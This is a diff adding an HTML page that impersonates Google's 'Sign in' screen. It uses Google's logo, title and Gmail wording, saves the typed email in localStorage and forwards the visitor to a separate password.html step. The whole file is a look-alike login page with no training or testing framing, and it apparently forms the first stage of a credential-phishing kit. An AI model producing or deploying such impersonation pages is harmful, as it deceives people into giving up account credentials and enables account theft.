@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f1f3f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            width: 392px;
+            padding: 40px;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .logo {
+            width: 75px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            color: #202124;
+            margin: 0;
+        }
+        p {
+            font-size: 14px;
+            color: #5f6368;
+            margin: 0;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            text-align: left;
+            margin-top: 20px;
+        }
+        .input-group label {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 5px;
+        }
+        .input-group input {
+            padding: 10px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 14px;
+            margin-bottom: 20px;
+            width: 100%;
+        }
+        .next-button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1a73e8;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .next-button:hover {
+            background-color: #165bca;
+        }
+        .footer {
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 20px;
+        }
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+    </style>
+    <script>
+        function submitEmail() {
+            const email = document.getElementById("email").value;
+            if (email) {
+                localStorage.setItem("email", email);
+                window.location.href = "password.html";
+            } else {
+                alert("Please enter your email.");
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google Logo" class="logo">
+        <h1>Sign in</h1>
+        <p>to continue to Gmail</p>
+        <div class="input-group">
+            <label for="email">Email or phone</label>
+            <input type="text" id="email" name="email" placeholder="Enter your email or phone">
+        </div>
+        <div class="input-group">
+            <button class="next-button" onclick="submitEmail()">Next</button>
+        </div>
+        <div class="footer">
+            <p><a href="#">Forgot email?</a></p>
+            <p>Not your computer? <a href="#">Use Guest mode</a> to sign in privately.</p>
+            <p><a href="#">Create account</a></p>
+        </div>
+    </div>
+</body>
+</html>
